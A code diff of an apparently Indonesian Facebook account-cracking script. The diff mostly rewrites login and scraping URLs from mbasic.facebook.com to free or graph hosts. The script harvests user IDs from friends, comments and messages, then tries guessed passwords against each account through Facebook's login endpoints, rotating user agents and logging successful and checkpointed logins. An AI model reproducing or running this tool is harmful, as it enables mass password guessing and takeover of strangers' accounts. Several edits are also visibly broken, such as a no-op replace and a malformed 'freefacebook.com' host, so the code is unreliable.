@@ -84,7 +84,7 @@ f"""{Hj}
           tapi rawan spam jadi wajar hasil nya
           tidak memuaskan dan jarang dapat hasil
 
-- mbasic: Metode ini proses nya lumayan lambat
+- free: Metode ini proses nya lumayan lambat
           tapi jika menggunakan metode ini hasil 
           yg di dapat memuaskan dan jarang kena
           spam
@@ -267,12 +267,12 @@ class masuk:
 	
 	def __init__(self,cok):
 		self.cok = cok
-		self.url = "https://mbasic.facebook.com"
+		self.url = "https://graph.facebook.com"
 		
 	def login(self):
 		try:
 			cek = requests.get(f"{self.url}/profile.php?v=info", cookies=romz_xyz(self.cok)).text
-			if "mbasic_logout_button" in cek:
+			if "free_logout_button" in cek:
 				from data import login, informasi
 				open("data/cookies","w").write(self.cok)
 				if "Laporkan Masalah" in cek:
@@ -300,7 +300,7 @@ def konverter(kukis):
 		'Host':'business.facebook.com',
 		'cache-control':'max-age=0',
 		'upgrade-insecure-requests':'1',
-		'user-agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
+		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
 		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
 		'content-type' : 'text/html; charset=utf-8',
 		'accept-encoding':'gzip, deflate',
@@ -353,13 +353,13 @@ class Menu():
 			tentang = json.loads(open("data/my_info","r").read().strip())
 		except FileNotFoundError:
 			from data import informasi
-			informasi.info(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text).myinfo()
+			informasi.info(kueh, requests.get("https://free.facebook.com/profile.php?v=info",cookies = kueh).text).myinfo()
 			os.system('python bff-2.py')
 		try:
 			a = requests.get(f"{self.url}/profile.php", cookies = kueh).text
 		except requests.exceptions.ConnectionError:
 			exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
-		if "mbasic_logout_button" not in a:
+		if "free_logout_button" not in a:
 			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
 			print ("%s%s cookie invalid "%(M,til));jeda(2)
 			os.system('python bff-2.py')
@@ -418,7 +418,7 @@ class pilihan:
 				if idt in[""," "]:
 					print ('\n%s%s isi yang benar'%(M,til));jeda(2)
 				elif(re.findall("\w+",idt)):
-					r = requests.get("https://mbasic.facebook.com/"+idt).text
+					r = requests.get("https://graph.facebook.com/"+idt).text
 					try:
 						user = re.findall('\;rid\=(\d+)\&',str(r))[0]
 					except:
@@ -457,11 +457,11 @@ class pilihan:
 				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
 				self.menu()
 			elif "m.facebook.com" in idt:
-				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
+				data_ = idt.replace("m.facebook.com","free.facebook.com")
 			elif "www.facebook.com" in idt:
-				data_ = idt.replace("www.facebook.com","mbasic.facebook.com")
+				data_ = idt.replace("www.facebook.com","free.facebook.com")
 			elif "free.facebook.com" in idt:
-				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
+				data_ = idt.replace("free.facebook.com","free.facebook.com")
 			else:
 				data_ = idt
 			try:
@@ -488,11 +488,11 @@ class pilihan:
 				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
 				self.menu()
 			elif "m.facebook.com" in idt:
-				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
+				data_ = idt.replace("m.facebook.com","free.facebook.com")
 			elif "www.facebook.com" in idt:
-				data_ = idt.replace("www.facebook.com","mbasic.facebook.com")
+				data_ = idt.replace("www.facebook.com","free.facebook.com")
 			elif "free.facebook.com" in idt:
-				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
+				data_ = idt.replace("free.facebook.com","free.facebook.com")
 			else:
 				data_ = idt
 			try:
@@ -560,7 +560,7 @@ class pilihan:
 						exit ('\n%s%s isi yang benar'%(M,til));jeda(2)
 		elif slut in['7','07']:
 			print('')
-			self.pesan('https://mbasic.facebook.com/messages')
+			self.pesan('https://free.facebook.com/messages')
 		elif slut in["8","08"]:
 			try:
 				response = requests.get(f"{self.url}/friends/center/suggestions",cookies=self.kueh).text
@@ -627,7 +627,7 @@ class pilihan:
 			if idt in['']:
 				print
 			elif(re.findall("\w+",idt)):
-				r = requests.get("https://mbasic.facebook.com/"+idt).text
+				r = requests.get("https://graph.facebook.com/"+idt).text
 				try:
 					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
 				except:
@@ -711,7 +711,7 @@ class pilihan:
 					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
 			for i in otw.find_all("a",href=True):
 				if "Lihat komentar lainnya…" in i.text:
-					self.komen("https://mbasic.facebook.com/"+i.get("href"))
+					self.komen("https://free.facebook.com/"+i.get("href"))
 		except:
 			pass
 
@@ -793,7 +793,7 @@ class pilihan:
 					except Exception as e:
 						continue
 				if 'Lihat Pesan Sebelumnya' in i.text:
-					self.pesan('https://mbasic.facebook.com/' + i.get('href'))
+					self.pesan('https://free.facebook.com/' + i.get('href'))
 		except:
 			pass
 			
@@ -802,7 +802,7 @@ class pilihan:
 		try:
 			true = False
 			respon = requests.get(data_, cookies=self.kueh).text
-			otw = re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',respon)
+			otw = re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/free/\?uid=(\\d*).*?"\>(.*?)</a\>',respon)
 			if len(otw)!=0:
 				for i in otw:
 					self.id.append(i[0]+"<=>"+i[1])
@@ -892,7 +892,7 @@ class Crack:
 	
 	def __init__(self):
 		self.id = []
-		self.url = "https://mbasic.facebook.com"
+		self.url = "https://free.facebook.com"
 		
 	def romiy(self, id):
 		self.id = id
@@ -951,14 +951,14 @@ class Crack:
 							manual()
 					print ('\n%s•%s [ %spilih methode login, silahkan coba satu² %s]\n'%(U,O,U,O))
 					print ('%s• %s01%s methode %sfree %s(fast) '%(U,P,O,M,O))
-					print ('%s• %s02%s methode %smbasic %s(slow) '%(U,P,O,P,O))
+					print ('%s• %s02%s methode %sfree %s(slow) '%(U,P,O,P,O))
 					print ('%s• %s03%s methode %smobile %s(very slow) '%(U,P,O,H,O))
 					manual(pwx.split(','))
 					break
 		elif unikers in ('T', 't'):
 			print ('\n%s•%s [ %spilih methode login, silahkan coba satu²%s ]\n'%(U,O,U,O))
 			print ('%s• %s01%s methode %sfree %s(fast)'%(U,P,O,M,O))
-			print ('%s• %s02%s methode %smbasic %s(slow) '%(U,P,O,P,O))
+			print ('%s• %s02%s methode %sfree %s(slow) '%(U,P,O,P,O))
 			print ('%s• %s03%s methode %smobile %s(very slow) '%(U,P,O,H,O))
 			self.langsung()
 		else:
@@ -1105,7 +1105,7 @@ class Crack:
 			loop += 1
 			self.touch(user, manual, **data)
 			
-	# MBASIC
+	# free
 	def basic(self, user, manual,**data):
 		global ok,cp,loop
 		warna = random.choice([M, H, K, B, U, O, P, J])
@@ -1116,11 +1116,11 @@ class Crack:
 				pw = pw.lower()
 				ses = requests.Session()
 				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
-				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 				if 'c_user' in ses.cookies.get_dict():
 					try:
 						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
@@ -1187,11 +1187,11 @@ class Crack:
 				pw = pw.lower()
 				ses = requests.Session()
 				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
-				headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+				p = ses.get('https://graph.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
 				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+				po = ses.post("https://freefacebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 				if 'c_user' in ses.cookies.get_dict():
 					try:
 						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
@@ -1307,7 +1307,7 @@ def hasil(ok,cp):
 # CEK APLIKASI 
 def cek_apk(kukis):
 	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
+	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -1316,7 +1316,7 @@ def cek_apk(kukis):
 			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 	except AttributeError:
 		print ("\r      %s• cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
+	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -1382,8 +1382,8 @@ data2 = {}
 def mengecek(user,pw):
 	global loop,ubah_pass,pwbaru
 	session=requests.Session()
-	url = "https://mbasic.facebook.com"
-	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
+	url = "https://free.facebook.com"
+	session.headers.update({"Host":"free.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://free.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
 	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
 	link=soup.find("form",{"method":"post"})
 	for x in soup("input"):
